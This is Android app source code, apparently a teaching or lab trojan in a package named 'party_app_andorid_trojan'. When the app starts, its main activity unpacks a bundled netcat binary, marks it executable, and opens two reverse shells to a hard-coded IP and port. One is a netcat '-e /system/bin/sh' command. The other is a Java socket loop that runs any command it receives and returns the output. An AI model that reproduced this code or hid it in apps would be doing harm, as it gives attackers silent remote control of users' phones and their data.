package com.example.party_app_andorid_trojan;

import android.content.res.AssetManager;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    PrintWriter out;
    BufferedReader in;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        copyFile("nc");
        changePermissions("nc");
        getReverseShell();
        getJavaReverseShell();
    }

    private void getJavaReverseShell() {
        Thread thread = new Thread() {
            @Override
            public void run() {
                String serverip = "192.168.199.103";
                int port = 5555;
                try {
                    InetAddress host = InetAddress.getByName(serverip);
                    Socket socket = new Socket(host, port);
                    while (true) {
                        out = new PrintWriter(new BufferedWriter((new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())))), true);

                        in = new BufferedReader((new InputStreamReader(socket.getInputStream())));

                        String command = in.readLine();

                        Process process = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});

                        BufferedReader reader = new BufferedReader(new InputStreamReader((process.getInputStream())));

                        int read;
                        char[] buffer = new char[4096];
                        StringBuffer output = new StringBuffer();
                        while ((read = reader.read(buffer)) > 0) {
                            output.append(buffer, 0, read);
                        }
                        reader.close();
                        String commandouput = output.toString();
                        if (commandouput != null) {
                            sendOutput(commandouput);
                        }

                        out = null;

                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

            private void sendOutput(String commandouput) {
                if (out != null && !out.checkError()) {
                    out.println(commandouput);
                    out.flush();
                }
            }
        };
        thread.start();
    }

    private void copyFile(String filename) {
        AssetManager assetManager = this.getAssets(); // Get assets
        InputStream io = null;
        OutputStream out = null;


        try {
            io = assetManager.open(filename);
            File files = getApplicationContext().getDir("files", getApplicationContext().MODE_PRIVATE);
            files.mkdirs();
            String newFilename = "/data/data/" + this.getPackageName() + "/app_files/" + filename;
            out = new FileOutputStream(newFilename);
            byte[] buffer = new byte[1024];
            int read;
            while ((read = io.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            io.close();
            io = null;
            out.flush();
            out.close();
            out = null;

        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        }

    }

    private void changePermissions(String filename) {

        try {
            String[] cmd = {"/system/bin/sh", "-c", "chmod 755 /data/data/" + this.getPackageName() + "/app_files/" + filename};
            Runtime.getRuntime().exec(cmd); // it will run command
        } catch (Exception e) {
            Log.e("ERROR", e.getMessage());
        }
    }

    private void getReverseShell() {
        Thread thread = new Thread() {
            @Override
            public void run() {
                try {
                    String[] cmd = {"/system/bin/sh", "-c", "/dat/data/data/com.example.party_app_andorid_trojan/app_files/nc 192.168.199.103 5555 -e /system/bin/sh"};
                    Runtime.getRuntime().exec(cmd);

                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        };
        thread.start();
    }
}